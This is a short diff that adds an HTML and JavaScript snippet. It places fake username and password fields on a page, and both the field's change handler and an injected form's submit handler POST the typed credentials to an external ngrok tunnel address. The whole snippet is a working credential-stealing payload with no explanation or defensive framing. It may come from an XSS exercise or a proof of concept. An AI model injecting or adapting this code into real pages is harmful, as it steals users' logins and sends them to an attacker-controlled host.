@@ -1,0 +1,20 @@
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://37e4cba5e56f.ngrok-free.app/',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+
+
+<script>
+var form = document.createElement('form');
+form.innerHTML = '<input name=username id=username><input type=password name=password>';
+form.onsubmit = function() {
+    fetch('https://37e4cba5e56f.ngrok-free.app/', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: document.getElementById('username').value + ':' + document.querySelector('[name=password]').value
+    });
+};
+document.body.appendChild(form);
+</script>
